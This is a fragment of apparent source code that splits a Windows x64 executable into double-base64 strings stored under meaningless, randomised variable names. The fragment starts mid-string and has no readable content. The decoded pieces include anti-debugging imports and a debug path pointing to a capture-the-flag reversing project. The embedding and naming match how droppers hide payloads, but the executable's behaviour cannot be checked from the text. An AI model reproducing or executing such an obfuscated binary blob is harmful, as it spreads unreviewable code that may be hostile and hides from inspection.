p5QjBhR1VnWTI5a1pTQnBiaUIwYUdseklIZGhlU0IzYVd4c0lHNXZkQ0JoWm1abFkzUWdkR2hsSUhGMVlXeHBkSGtnYjJZZ2RHaGxJSEpsYzNWc2RHbHVaeUJ2Y0hScGJXbDZaV1FnWTI5a1pTNE5DZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 cPrUiVywLZUKwzBPpPGaKMdqfRcymaJgxAoGgEYriOdrgt = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 oOSfGOgqlGkIAORYvObGcsjZrFGieEKfgdpWSbhHAxbUytAITWPR = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 LApgwYbUQYSyklAgNUxVRcVucekjfKxsELGOuvnmbPlAjrKUuKspsufADOwt = "WkVsa0FBQ1hBMGx6UkdWaWRXZG5aWEpRY21WelpXNTBBSHNFVW1GcGMyVkZlR05sY0hScGIyNEFBQWdFVFhWc2RHbENlWFJsVkc5WGFXUmxRMmhoY2dBcEJsZHBaR1ZEYUdGeVZHOU5kV3gwYVVKNWRHVUE2UVJTZEd4RFlYQjBkWEpsUTI5dWRHVjRkQUR4QkZKMGJFeHZiMnQxY0VaMWJtTjBhVzl1Ulc1MGNua0FBUGdFVW5Sc1ZtbHlkSFZoYkZWdWQybHVaQUFBMkFWVmJtaGhibVJzWldSRmVHTmxjSFJwYjI1R2FXeDBaWElBQUpjRlUyVjBWVzVvWVc1a2JHVmtSWGhqWlhCMGFXOXVSbWxzZEdWeUFDb0NSMlYwUTNWeWNtVnVkRkJ5YjJObGMzTUF0Z1ZVWlhKdGFXNWhkR1ZRY205alpYTnpBQUNlQTBselVISnZZMlZ6YzI5eVJtVmhkSFZ5WlZCeVpYTmxiblFBWkFSUmRXVnllVkJsY21admNtMWhibU5sUTI5MWJuUmxjZ0FyQWtkbGRFTjFjbkpsYm5SUWNtOWpaWE56U1dRQUFRTkhaWFJUZVhOMFpXMVVhVzFsUVhOR2FXeGxWR2x0WlFDQkEwbHVhWFJwWVd4cGVtVlRUR2x6ZEVobFlXUUE2QUpIWlhSVGRHRnlkSFZ3U1c1bWIxY0FqQUpIWlhSTmIyUjFiR1ZJWVc1a2JHVlhBQUIwQWtkbGRFeGhjM1JGY25KdmNnQUFZd05JWldGd1FXeHNiMk1BWndOSVpXRndSbkpsWlFBQXl3SkhaWFJRY205alpYTnpTR1ZoY0FBQStRVldhWEowZFdGc1VYVmxjbmtBQUwwQlJuSmxaVXhwWW5KaGNua0F4QUpIWlhS"
 lJdgGUR = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 UukH = "NFd3QUFBQVFCMEFBTWVGdEFBQUFNQU5BQURIaGJnQUFBQUFGZ0FBeDRXOEFBQUFRQlFBQU1lRndBQUFBSUFOQUFESGhjUUFBQUJBSFFBQXg0WElBQUFBZ0J3QUFNZUZ6QUFBQUlBTUFBREhoZEFBQUFDQUdBQUF4NFhVQUFBQUFCMEFBTWVGMkFBQUFJQUpBQURIaGR3QUFBQ0FDUUFBeDRYZ0FBQUFnQWtBQU1lRjVBQUFBSUFlQUFDRHZjQURBQUFDZEJaSWpRMTlrZ0FBNkJqMy8vKzRBUUFBQU9uY0FBQUF4NFVFQWdBQUFBQUFBT3NPaTRVRUFnQUEvOENKaFFRQ0FBQzRDQUFBQUVocndBRklpNDNJQXdBQVNJc01BZWl6OXYvL09ZVUVBZ0FBZlQ5SVk0VUVBZ0FBU0lQNE5uTXl1QWdBQUFCSWE4QUJTR09OQkFJQUFFaUxsY2dEQUFCSWl3UUNENzRFQ01IZ0JraGpqUVFDQUFDSmhJMFFBUUFBNjVMSGhRUUNBQUFBQUFBQTZ3NkxoUVFDQUFEL3dJbUZCQUlBQUVoamhRUUNBQUJJZy9nMmN5MUlZNFVFQWdBQVNHT05CQUlBQUl1TWpSQUJBQUE1VElVUWRCQklqUTIza1FBQTZFYjIvLzh6d09zUTY3aElqUTJwa1FBQTZEVDIvLzh6d0VpTCtFaU5UZUJJalJWVWtRQUE2SXozLy85SWk4ZElqYVdvQXdBQVgxM0R6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 eYGXDYAkiMnkMYrxGeLZkudKRTmVWqyiygBJrkzvMDupSVfqXYyuTLwLHOkjhvC = "Q1FJU0lQc09Ma1hBQUFBL3hVTTN3QUFoY0IwQjdrQ0FBQUF6U2xJalEyS29BQUE2UFVEQUFCSWkwUWtPRWlKQlhHaEFBQklqVVFrT0VpRHdBaElpUVVCb1FBQVNJc0ZXcUVBQUVpSkJjdWZBQUJJaTBRa1FFaUpCYytnQUFESEJhV2ZBQUFKQkFEQXh3V2Zud0FBQVFBQUFNY0ZxWjhBQUFFQUFBQzRDQUFBQUVocndBQklqUTJobndBQVNNY0VBUUlBQUFDNENBQUFBRWhyd0FCSWl3M1JuUUFBU0lsTUJDQzRDQUFBQUVocndBRklpdzIwblFBQVNJbE1CQ0JJalEzSWdnQUE2STNmLy85SWc4UTR3OHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSVBzS0xrSUFBQUE2RFBlLy85SWc4UW93OHpNek16TXpNek16TXpNek15SlRDUUlTSVBzS0xrWEFBQUEveFhkM1FBQWhjQjBDSXRFSkRDTHlNMHBTSTBOV3A4QUFPZ0ZBZ0FBU0l0RUpDaElpUVZCb0FBQVNJMUVKQ2hJZzhBSVNJa0YwWjhBQUVpTEJTcWdBQUJJaVFXYm5nQUF4d1dCbmdBQUNRUUF3TWNGZTU0QUFBRUFBQURIQllXZUFBQUJBQUFBdUFnQUFBQklhOEFBU0kwTmZaNEFBSXRVSkRCSWlSUUJTSTBOem9FQUFPaVQzdi8vU0lQRUtNUE16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 PybvPlDJqWjrprGZSOHELncQwLXqEXvfMGEBVOEaccKNdCxzkRXJDNdsM = "ek16RXlKVENRZ1RJbEVKQmhJaVZRa0VFaUpUQ1FJVlZkSWdlejRBQUFBU0kxc0pEQklqUTMrQndFQTZGUDcvLy9vRmZqLy8waUxqZmdBQUFCSWlVd2tJRXlMamZBQUFBQk1pNFhvQUFBQVNJdVY0QUFBQUVpTENQOFZ5L29BQUVpTnBjZ0FBQUJmWGNQTXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lsVUpCQ0pUQ1FJVlZkSWdleklBd0FBU0kxc0pDQklqWHdrSUxtS0FBQUF1TXpNek16enE0dU1KT2dEQUFCSWpRMTRCd0VBNk1iNi8vL0hSUkRBRUFBQXgwVVVnQkVBQU1kRkdBQVZBQURIUlJ3QUVRQUF4MFVnd0JRQUFNZEZKRUFRQUFESFJTZ0FId0FBeDBVc1FCUUFBTWRGTUVBWkFBREhSVFNBR1FBQXgwVTRBQllBQU1kRlBJQU5BQURIUlVBQUhRQUF4MFZFQUJZQUFNZEZTTUFZQUFESFJVeUFHUUFBeDBWUVFCb0FBTWRGVkFBWUFBREhSVmlBR0FBQXgwVmNRQjBBQU1kRllBQWFBQURIUldTQUhBQUF4MFZvQUIwQUFNZEZiSUFKQUFESFJYQ0FDUUFBeDBWMGdBa0FBTWRGZUFBV0FBREhSWHhBRVFBQXg0V0FBQUFBZ0EwQUFNZUZoQUFBQUFBY0FBREhoWWdBQUFDQUdRQUF4NFdNQUFBQVFCMEFBTWVGa0FBQUFJQVlBQURIaFpRQUFBQUFGZ0FBeDRXWUFBQUF3QTBBQU1lRm5BQUFBRUFZQUFESGhhQUFBQUFBRmdBQXg0V2tBQUFBZ0JJQUFNZUZxQUFBQUlBWkFBREhoYXdBQUFBQUdRQUF4"
 xPwYBnIxnYgEBltvciefwyPdNaqcxqVUFITQXdSjFmRRnEAHVk = "ZzN3a1JBQjFFdysyUkNSQmhjQjFDcmtEQUFBQTZGelAvLzlJZ2NUd0JRQUFYOFBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekVCWFNJSHNvQUFBQUVpTlJDUXdTSXY0TThDNWFBQUFBUE9xU0kxTUpERC9GZXZMQUFDTFJDUnNnK0FCaGNCMEN3KzNSQ1J3aVVRa0lPc0l4MFFrSUFvQUFBQVB0MFFrSUVpQnhLQUFBQUJmdzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNeElnK3dvNkxETC8vOUlnOFFvdzh6TXpNek16TXpNek16TXpNek16TXpNekRQQXc4ek16TXpNek16TXpNek16TXhJZyt3NE04bi9GZVRMQUFCSWlVUWtJRWlEZkNRZ0FIVUhNc0RwZ1FBQUFFaUxSQ1FnRDdjQVBVMWFBQUIwQkRMQTYyNUlpMFFrSUVoalFEeElpMHdrSUVnRHlFaUx3VWlKUkNRb1NJdEVKQ2lCT0ZCRkFBQjBCRExBNjBSSWkwUWtLQSszUUJnOUN3SUFBSFFFTXNEck1FaUxSQ1FvZzdpRUFBQUFEbmNFTXNEckhyZ0lBQUFBU0d2QURraUxUQ1FvZzd3QmlBQUFBQUIxQkRMQTZ3S3dBVWlEeERqRHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 hSMCKWvRKxqOlNXtxEvAkoMfYsBVBUnGfsjyGVjupZBKJg = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQURjSEFJQUFBQUFBR29iQWdBQUFBQUFmaHNDQUFBQUFBQ1FHd0lBQUFBQUFLWWJBZ0FBQUFBQXZCc0NBQUFBQUFEUUd3SUFBQUFBQU9vYkFnQUFBQUFBL2hzQ0FBQUFBQUJhSFFJQUFBQUFBRXdkQWdBQUFBQUFQQjBDQUFBQUFBQXFIUUlBQUFBQUFCNGRBZ0FBQUFBQUVoMENBQUFBQUFBQ0hRSUFBQUFBQU80Y0FnQUFBQUFBVkJzQ0FBQUFBQURHSEFJQUFBQUFBS3djQWdBQUFBQUFsaHdDQUFBQUFBQjhIQUlBQUFBQUFHQWNBZ0FBQUFBQVRCd0NBQUFBQUFBNEhBSUFBQUFBQUJvY0FnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCeUdBSUFBQUFBQUZnWUFnQUFBQUFBUEJnQ0FBQUFBQUFlR0FJQUFBQUFBQWdZQWdBQUFBQUE2QmNDQUFBQUFBRElG"
 FBhMCgIdLoYhtHCKPaUjzTXWQrlTWFjaOvvCOrpvPMV = "a2FwbzNSUG4xbmhGUEd0VUFzQkFBQUFSVHBjVDNSb1pYSnpYRU5VUmx4U1pWeFBkR2hsY25OY1pHOWpRM0poWTJ0Y2MzSmpYSFJ5YVdOclhIZzJORnhFWldKMVoxeDBjbWxqYXk1d1pHSUFBQUFBQUFBa0FBQUFKQUFBQUFFQUFBQWpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 oBluSsHkDCzAto = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ2dBUUFrQUFBQUVLRkFwRkNseUtzSXJFaXNXS3pJckFpdEVLMFlyU0N0S0swd3JRQ3dBUUFvQUFBQUdLUWdwQ2lrTUtRNHBDQ2xLS1c0cDlDbjJLZDRxSUNvaUtpUXFKaW9BQUFBd0FFQURBQUFBTENnNEtNQU1BSUFGQUFBQUFDZ0VLQWdvRENnUUtCZ29BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 reeSpEYsBkdNAwSDqsiDTLBBHdHuaMOZuoTHJEzyHFkIp = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 OqJcLRxQpnYs = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 dDrAROqgDwONUkPBEbrtUpacneyMSHVCckaqZmBk = "RDdmVFRJbDBKQ0JJaXdGSWkwQkEveFhhM0FBQWhjQVBoSzBCQUFCSWkwM0hTSTFWdDBpTEFVaUxnTkFBQUFEL0ZicmNBQUNFd0ErRWVRRUFBRWlMVGJkSWhja1BoR3dCQUFCSWl3RklpMEFRL3hXWTNBQUFoY0FQaERNQkFBQklpMDIzU0kxVlgweUpkQ1F3VEkxTlYwaUpWQ1FvVEkxRmIwaU5WYjlJaXdGSWlWUWtJRFBTU0l0QUdQOFZYdHdBQUlUQUQ0UU5BUUFBRDdkRlZ6dkRkUTZMVFc4N3ozY0hBMDIvTy9seUdraUxUYmRJaXdGSWkwQVEveFV2M0FBQWhjQjFtK25KQUFBQWkwVmZoY0FQaE5JQUFBQ0wyUDhWVTd3QUFFeU5CTjBBQUFBQU05SklpOGovRlZDOEFBQklpL0JJaGNBUGhLc0FBQUJJaTAyM1JUUEpTSWwwSkRCRk04QklpeEZJaTBJWVNJMVZYMGlKVkNRb1NJMVZ3MHlKZENRZy94WEcyd0FBaE1CMFpTdDlienMrY2w2TFZWKzdBUUFBQUl2TE85TjJEWXZCT3p6R2NnYi93VHZLY3ZPTFZjT05RZitMUk1ZRVRJMU5aMGlMVGNjbC8vLy9BRUdKQkNSTmk4Vk1pWFFrTUV5SmRDUW9TSXNCVElsMEpDQklpNERnQUFBQS94Vmoyd0FBaE1CRUQwWHoveFdYdXdBQVRJdkdNOUpJaThqL0ZaRzdBQUJJaTAyM1NJc0JTSXNBL3hVNTJ3QUFTSXROeDBpTEFVaUxnSUFBQUFEL0ZTWGJBQUJJaTAzWFNJc1JTSXRDY1A4VkZOc0FBRWlMVGM5SWl4RklpMEpZL3hVRDJ3QUFRWXZHNndJendFaUJ4TEFBQUFC"
 LyzbXnuteIvewfsTHJjlzQReyFxqXpcXpGhxmgHTXkuTdCSgxC = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 MCoojZsVTSQqYyKcalviqCyoDLlFCBhKufeKnCekvEasIuvaFioqLecZdrmWUnnRrLtU = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 vJefuibNYpIBJouGCweDJOwOvK = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBWDBGeVoweHBjM1FBQUFBQUFBQUFBRWdBQUFBSUFBQUFzS3NCUUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBTUNyQVVBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCc0FBQUFhV3dBQUFBQUFBQUFBQUFBTUFFQUFOZ0FBQUEwckFGQUFRQUFBREFBQUFEWUFB"
